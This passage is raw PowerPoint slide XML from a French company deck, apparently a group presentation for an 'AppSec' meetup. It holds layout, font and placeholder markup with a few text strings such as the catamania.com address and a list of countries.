            <p:ph type="body" sz="quarter" idx="12" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472251" y="349793"/>
            <a:ext cx="8203976" cy="257220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="l">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1400">
                <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>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fr-FR"/>
              <a:t>Texte</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="Connecteur droit 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{813832DA-5B09-19B6-C71F-8F92DA37C18B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="0" y="6319262"/>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3BEBF0F1-9CDC-4728-C2FE-BF0296A4BCCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="-2" y="762971"/>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563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4552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3" name="Espace réservé pour une image  11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{81E69F07-ABF4-CF34-1369-2C8BB569DA83}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="762971"/>
            <a:ext cx="12192002" cy="5556867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="5" name="Connecteur droit 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3764CC2C-B8C5-F99B-0F38-11C788A065E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="0" y="6319262"/>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8EC396CA-3FC0-A5EA-B7FC-4BFAA5285ECD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="-2" y="762971"/>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Espace réservé du texte 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{11600361-578A-0C9B-257C-A4DF4BD64A8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="12" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472251" y="349793"/>
            <a:ext cx="8203976" cy="257220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="l">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1400">
                <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="457200" indent="0">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1400"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="914400" indent="0">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1400"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1371600" indent="0">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1400"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1828800" indent="0">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1400"/>
            </a:lvl5pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="fr-FR"/>
              <a:t>Texte</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="98987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2.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout3.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image8.sv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Image 11" descr="catamania_logo2014_blanc.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{418BDEEA-0C2A-4009-A84C-CB6277EC63B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34373" y="188022"/>
            <a:ext cx="1610875" cy="468222"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Graphique 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BEF71CB6-1B37-84A2-7356-81DEE60FB51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864930" y="200192"/>
            <a:ext cx="2647933" cy="923382"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Graphique 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DEE7C9B9-79D1-32F4-BC1B-502606F0A52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851208" y="5548181"/>
            <a:ext cx="1673531" cy="240887"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3247781363"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst>
    <p:sldLayoutId id="2147483650" r:id="rId1"/>
    <p:sldLayoutId id="2147483651" r:id="rId2"/>
  </p:sldLayoutIdLst>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:buNone/>
        <a:defRPr sz="3200" kern="1200" baseline="0">
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:latin typeface="Nunito ExtraLight" panose="00000300000000000000" pitchFamily="2" charset="0"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="+mj-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:lnSpc>
          <a:spcPct val="100000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPts val="0"/>
        </a:spcBef>
        <a:buFontTx/>
        <a:buNone/>
        <a:defRPr sz="1400" kern="1200" cap="all" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
          <a:ea typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPts val="0"/>
        </a:spcBef>
        <a:buFontTx/>
        <a:buNone/>
        <a:defRPr sz="1400" kern="1200" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
          <a:ea typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="288000" indent="-180000" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPts val="800"/>
        </a:spcBef>
        <a:buClr>
          <a:schemeClr val="tx2"/>
        </a:buClr>
        <a:buSzPct val="100000"/>
        <a:buFontTx/>
        <a:buBlip>
          <a:blip r:embed="rId9"/>
        </a:buBlip>
        <a:defRPr sz="1400" b="0" i="0" kern="1200" cap="all" spc="0" baseline="0">
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
          <a:ea typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="396000" indent="-144000" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPts val="800"/>
        </a:spcBef>
        <a:buClr>
          <a:schemeClr val="accent1"/>
        </a:buClr>
        <a:buSzPct val="100000"/>
        <a:buFont typeface="Arial"/>
        <a:buChar char="•"/>
        <a:defRPr sz="1400" kern="1200" cap="none" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
          <a:ea typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="540000" indent="-144000" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPts val="800"/>
        </a:spcBef>
        <a:buClr>
          <a:schemeClr val="bg2"/>
        </a:buClr>
        <a:buFont typeface="Lucida Grande"/>
        <a:buChar char="-"/>
        <a:defRPr sz="1200" kern="1200" baseline="0">
          <a:solidFill>
            <a:srgbClr val="1F262F"/>
          </a:solidFill>
          <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
          <a:ea typeface="Roboto" panose="02000000000000000000" pitchFamily="2"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Graphique 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1D5FCB4-3D03-D60E-3812-4A9DC99AD7E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745546" y="168505"/>
            <a:ext cx="1946944" cy="466334"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="ZoneTexte 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED62AD85-A975-725F-8236-F6B17809E0EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="499510" y="6474052"/>
            <a:ext cx="1243565" cy="215444"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="800"/>
              <a:t>www.catamania.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="ZoneTexte 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A2D11051-1855-547F-D64B-F34E3780CEC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10448925" y="6474052"/>
            <a:ext cx="1243565" cy="215444"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="800"/>
              <a:t>Page </a:t>
            </a:r>
            <a:fld id="{786088AF-BE38-4804-B4EC-1BFFB3F05A88}" type="slidenum">
              <a:rPr lang="fr-FR" sz="800" smtClean="0"/>
              <a:pPr algn="r"/>
              <a:t>‹N°›</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR" sz="800"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4185211340"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst>
    <p:sldLayoutId id="21474836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3146897"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst>
    <p:sldLayoutId id="2147483706" r:id="rId1"/>
    <p:sldLayoutId id="214748370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6.jpe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jpe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6.jpe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4.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6.jpe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14.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Espace réservé pour une image  20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EB19DB2A-35DC-2405-AAF1-D879A54A1103}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="15"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect l="16522" t="13430" b="-9"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="762971"/>
            <a:ext cx="12192002" cy="5556867"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Espace réservé du texte 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A80036F7-456F-9AB4-0B75-F0A41D056215}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr lIns="91440" tIns="45720" rIns="91440" bIns="45720" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Inter Medium"/>
              </a:rPr>
              <a:t>FRANCE -  MAROC - LUXEMBOURG – CANADA - SUISSE </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Graphique 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0E978BD0-22AB-0568-DA60-E7BFF71072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218" y="655918"/>
            <a:ext cx="5546164" cy="5546164"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="10" name="Connecteur droit 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABCBF911-C64A-3917-4C2A-F7BC1415E05B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="0" y="6319262"/>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Connecteur droit 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BB0D61D3-390D-4C9C-872C-DB5850F71E19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="-2" y="762971"/>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6" name="Graphique 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5CF9BC6D-B7D1-1565-EC46-4B93F493631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339618" y="4012775"/>
            <a:ext cx="2383808" cy="1725776"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="ZoneTexte 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FFD8D136-14D0-7ADA-CFB8-228C29379E24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472251" y="6463672"/>
            <a:ext cx="3900673"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srgbClr val="385985"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>La transformation digitale au service du progrès humain</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="ZoneTexte 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8434F6E8-8CCE-5807-D759-0409098887EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9051879" y="6463672"/>
            <a:ext cx="2013044" cy="215444"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="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dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="385985"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Document officiel MÀJ 2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="385985"/>
                </a:solidFill>
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>1-01-2026</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="fr-FR" sz="800" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="385985"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              <a:ea typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="ZoneTexte 23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC8EE0BC-F8F5-67A0-929D-3E0F48D0487F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8134066" y="306550"/>
            <a:ext cx="2930857" cy="246221"/>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srgbClr val="31AFDE"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>2026</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="fr-FR" sz="1000" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="385985"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> PRÉSENTATION GROUPE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="ZoneTexte 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0424E83D-6FDD-0979-DB7D-25ADAEC669BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472251" y="2105942"/>
            <a:ext cx="3404424" cy="2862322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPts val="3600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="fr-FR" sz="3200" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="31AFDE"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Meetup </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="fr-FR" sz="3200" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="31AFDE"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>AppSec</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="fr-FR" sz="3200" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="31AFDE"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPts val="3600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="fr-FR" sz="3200" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
